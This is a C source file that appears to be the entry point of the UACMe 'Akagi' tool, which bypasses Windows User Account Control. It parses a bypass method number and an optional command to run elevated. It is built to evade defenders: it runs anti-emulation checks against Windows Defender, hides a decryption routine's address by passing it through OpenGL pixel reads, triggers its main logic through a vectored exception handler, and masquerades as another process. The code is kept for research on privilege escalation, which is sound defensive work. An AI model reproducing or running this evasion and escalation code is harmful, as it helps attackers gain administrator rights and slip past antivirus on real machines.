/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2017
*
*  TITLE:       MAIN.C
*
*  VERSION:     2.72
*
*  DATE:        26 May 2017
*
*  Program entry point.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#define OEMRESOURCE
#include "global.h"
#include <gl\GL.h>
#pragma comment(lib, "opengl32.lib")
#pragma comment(lib, "comctl32.lib")

UACMECONTEXT g_ctx;
TEB_ACTIVE_FRAME_CONTEXT g_fctx = { 0, "(=^..^=)" };

static pfnDecompressPayload pDecryptPayload = NULL;

/*
* ucmInit
*
* Purpose:
*
* Prestart phase with MSE / Windows Defender anti-emulation part.
*
*/
UINT ucmInit(
    _Inout_ UCM_METHOD *Out
)
{
    BOOL        cond = FALSE;
    UCM_METHOD  Method;
    DWORD       Result = ERROR_SUCCESS;
    PVOID       Ptr;
    MSG         msg1;
    WNDCLASSEX  wincls;
    HINSTANCE   inst;
    BOOL        rv = 1;
    HWND        TempWindow;
    HGLRC       ctx;
    HDC         dc1;
    int         index;

#ifndef _DEBUG
    TOKEN_ELEVATION_TYPE    ElevType;
#endif	

    ULONG bytesIO, dwType;
    WCHAR szBuffer[MAX_PATH + 1];
    WCHAR WndClassName[] = TEXT("reirraC");
    WCHAR WndTitleName[] = TEXT("igakA");

    PIXELFORMATDESCRIPTOR pfd = {
        sizeof(PIXELFORMATDESCRIPTOR),
        1,
        PFD_DRAW_TO_WINDOW | PFD_SUPPORT_OPENGL | PFD_DOUBLEBUFFER | PFD_SWAP_EXCHANGE | PFD_GENERIC_ACCELERATED,
        PFD_TYPE_RGBA,
        32, 8, 0, 8, 0, 8, 0, 8, 0,
        0, 0, 0, 0, 0, 32, 0, 0,
        PFD_MAIN_PLANE, 0, 0, 0, 0
    };

    *Out = 0;

    do {
        //we could read this from usershareddata but why not use it
        bytesIO = 0;
        RtlQueryElevationFlags(&bytesIO);
        if ((bytesIO & DBG_FLAG_ELEVATION_ENABLED) == 0) {
            Result = ERROR_ELEVATION_REQUIRED;
            break;
        }

        if (FAILED(CoInitialize(NULL))) {
            Result = ERROR_INTERNAL_ERROR;
            break;
        }

        InitCommonControls();

        //fill common data block
        RtlSecureZeroMemory(&g_ctx, sizeof(g_ctx));

        g_ctx.ucmHeap = RtlCreateHeap(HEAP_GROWABLE, NULL, 0, 0, NULL, NULL);
        if (g_ctx.ucmHeap == NULL) {
            Result = ERROR_NOT_ENOUGH_MEMORY;
            break;
        }

        g_ctx.AkagiFlag = AKAGI_FLAG_KILO;
        inst = NtCurrentPeb()->ImageBaseAddress;

        dwType = 0;
        bytesIO = 0;
        RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
        GetCommandLineParam(GetCommandLine(), 1, szBuffer, MAX_PATH, &bytesIO);
        if (bytesIO == 0)
            return ERROR_BAD_ARGUMENTS;

        Method = strtoul(szBuffer);
        *Out = Method;

#ifndef _DEBUG
        if (Method == UacMethodTest)
            return ERROR_BAD_ARGUMENTS;
#endif
        if (Method >= UacMethodMax)
            return ERROR_BAD_ARGUMENTS;

        if (Method == UacMethodSXS)
            g_ctx.AkagiFlag = AKAGI_FLAG_TANGO;

#ifndef _DEBUG
        ElevType = TokenElevationTypeDefault;
        if (supGetElevationType(&ElevType)) {
            if (ElevType != TokenElevationTypeLimited) {
                return ERROR_UNSUPPORTED_TYPE;
            }
        }
#endif
        //
        // Process optional parameter.
        //
        RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
        bytesIO = 0;
        GetCommandLineParam(GetCommandLine(), 2, szBuffer, MAX_PATH, &bytesIO);
        if (bytesIO > 0) {
            g_ctx.OptionalParameterLength = bytesIO;
            _strcpy(g_ctx.szOptionalParameter, szBuffer);
        }

        wincls.cbSize = sizeof(WNDCLASSEX);
        wincls.style = CS_OWNDC;
        wincls.lpfnWndProc = &wdDummyWindowProc;
        wincls.cbClsExtra = 0;
        wincls.cbWndExtra = 0;
        wincls.hInstance = inst;
        wincls.hIcon = NULL;
        wincls.hCursor = (HCURSOR)LoadImage(NULL, MAKEINTRESOURCE(OCR_NORMAL), IMAGE_CURSOR, 0, 0, LR_SHARED);
        wincls.hbrBackground = NULL;
        wincls.lpszMenuName = NULL;
        wincls.lpszClassName = WndClassName;
        wincls.hIconSm = 0;
        RegisterClassEx(&wincls);

        TempWindow = CreateWindowEx(WS_EX_TOPMOST, WndClassName, WndTitleName,
            WS_VISIBLE | WS_POPUP | WS_CLIPCHILDREN | WS_CLIPSIBLINGS, 0, 0, 30, 30, NULL, NULL, inst, NULL);

        //remember dll handles
        g_ctx.hKernel32 = GetModuleHandleW(KERNEL32_DLL);
        if (g_ctx.hKernel32 == NULL) {
            Result = ERROR_INVALID_HANDLE;
            break;
        }

        g_ctx.hOle32 = GetModuleHandleW(OLE32_DLL);
        if (g_ctx.hOle32 == NULL) {
            g_ctx.hOle32 = LoadLibraryW(OLE32_DLL);
            if (g_ctx.hOle32 == NULL) {
                Result = ERROR_INVALID_HANDLE;
                break;
            }
        }
        g_ctx.hShell32 = GetModuleHandleW(SHELL32_DLL);
        if (g_ctx.hShell32 == NULL) {
            g_ctx.hShell32 = LoadLibraryW(SHELL32_DLL);
            if (g_ctx.hShell32 == NULL) {
                Result = ERROR_INVALID_HANDLE;
                break;
            }
        }

        //query basic directories
        supExpandEnvironmentStrings(L"%systemroot%\\system32\\", g_ctx.szSystemDirectory, MAX_PATH);
        supExpandEnvironmentStrings(L"%temp%\\", g_ctx.szTempDirectory, MAX_PATH);

        //query build number
        RtlGetNtVersionNumbers(NULL, NULL, &g_ctx.dwBuildNumber);
        g_ctx.dwBuildNumber &= 0x00003fff;

        if (g_ctx.dwBuildNumber < 7000) {
            Result = ERROR_INSTALL_PLATFORM_UNSUPPORTED;
            break;
        }

        g_ctx.IsWow64 = supIsProcess32bit(GetCurrentProcess());

        if (g_ctx.dwBuildNumber > 14997) {
            g_ctx.IFileOperationFlags = FOF_NOCONFIRMATION | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION;
        }
        else {
            g_ctx.IFileOperationFlags = FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION;
        }

        //flashes and sparks
        dc1 = GetDC(TempWindow);
        index = ChoosePixelFormat(dc1, &pfd);
        SetPixelFormat(dc1, index, &pfd);
        ctx = wglCreateContext(dc1);
        wglMakeCurrent(dc1, ctx);
        glDrawBuffer(GL_BACK);
        glClear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);
        glMatrixMode(GL_PROJECTION);
        glLoadIdentity();
        glBegin(GL_TRIANGLES);
        glColor4i(1, 0, 1, 0);
        glVertex2i(-1, -1);
        glVertex2i(0, 1);
        glVertex2i(1, -1);
        glEnd();
#pragma warning(push)
#pragma warning(disable: 4054)//code to data
        Ptr = (PVOID)&DecompressPayload;
#pragma warning(pop)
        pDecryptPayload = NULL;
#ifdef _WIN64
        glDrawPixels(2, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
        glReadPixels(0, 0, 2, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecryptPayload);
#else
        glDrawPixels(1, 1, GL_RGBA, GL_UNSIGNED_BYTE, &Ptr);
        glReadPixels(0, 0, 1, 1, GL_RGBA, GL_UNSIGNED_BYTE, (GLvoid *)&pDecryptPayload);
#endif
        SwapBuffers(dc1);
        SendMessage(TempWindow, WM_CLOSE, 0, 0);

        do {
            rv = GetMessage(&msg1, NULL, 0, 0);

            if (rv == -1)
                break;

            TranslateMessage(&msg1);
            DispatchMessage(&msg1);
        } while (rv != 0);

        UnregisterClass(WndClassName, inst);

        g_ctx.DecryptRoutine = pDecryptPayload;

    } while (cond);

    return Result;
}

/*
* ucmMain
*
* Purpose:
*
* Program entry point.
*
*/
UINT ucmMain()
{
    UINT        uResult;
    UCM_METHOD  Method = 0;

    wdCheckEmulatedVFS();

    uResult = ucmInit(&Method);
    switch (uResult) {

    case ERROR_ELEVATION_REQUIRED:
        ucmShowMessage(TEXT("Please enable UAC for this account."));
        break;

    case ERROR_UNSUPPORTED_TYPE:
        ucmShowMessage(TEXT("Admin account with limited token required."));
        break;

    case ERROR_INSTALL_PLATFORM_UNSUPPORTED:
        ucmShowMessage(TEXT("This Windows version is not supported."));
        break;

    case ERROR_BAD_ARGUMENTS:
        ucmShowMessage(TEXT("Usage: Akagi.exe [Method] [OptionalParamToExecute]"));
        break;
    default:
        break;

    }
    if (uResult != ERROR_SUCCESS) {
        return ERROR_INTERNAL_ERROR;
    }

    supMasqueradeProcess();

    if (MethodsManagerCall(Method))
        return ERROR_SUCCESS;
    else
        return GetLastError();
}

DWORD g_ExCookie = 0;

LONG NTAPI ucmVehHandler(
    EXCEPTION_POINTERS *ExceptionInfo
)
{
    UACME_THREAD_CONTEXT *uctx;

    if (ExceptionInfo->ExceptionRecord->ExceptionCode == STATUS_SINGLE_STEP)
        if (ExceptionInfo->ExceptionRecord->ExceptionFlags == g_ExCookie) {
            uctx = (UACME_THREAD_CONTEXT*)RtlGetFrame();
            while ((uctx != NULL) && (uctx->Frame.Context != &g_fctx)) {
                uctx = (UACME_THREAD_CONTEXT *)uctx->Frame.Previous;
            }
            if (uctx) {
                if (uctx->ucmMain)
                    uctx->ReturnedResult = uctx->ucmMain();
            }
            ExceptionInfo->ContextRecord->EFlags |= 0x10000;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    return EXCEPTION_CONTINUE_SEARCH;
}

/*
* main
*
* Purpose:
*
* Program entry point.
*
*/
VOID main()
{
    PVOID ExceptionHandler;
    DWORD k;
    EXCEPTION_RECORD ex;
    UACME_THREAD_CONTEXT uctx;

    wdCheckEmulatedAPI();

    RtlSecureZeroMemory(&uctx, sizeof(uctx));

    ExceptionHandler = RtlAddVectoredExceptionHandler(1, &ucmVehHandler);
    if (ExceptionHandler) {
        uctx.Frame.Context = &g_fctx;
        uctx.ucmMain = (pfnEntryPoint)ucmMain;
        RtlPushFrame((PTEB_ACTIVE_FRAME)&uctx);

#pragma warning(suppress: 28159)
        k = ~GetTickCount();
        g_ExCookie = RtlRandomEx(&k);

        RtlSecureZeroMemory(&ex, sizeof(ex));
        ex.ExceptionFlags = g_ExCookie;
        ex.ExceptionCode = (DWORD)STATUS_SINGLE_STEP;
        RtlRaiseException(&ex);

        RtlRemoveVectoredExceptionHandler(ExceptionHandler);
        RtlPopFrame((PTEB_ACTIVE_FRAME)&uctx);
    }
    ExitProcess(uctx.ReturnedResult);
}
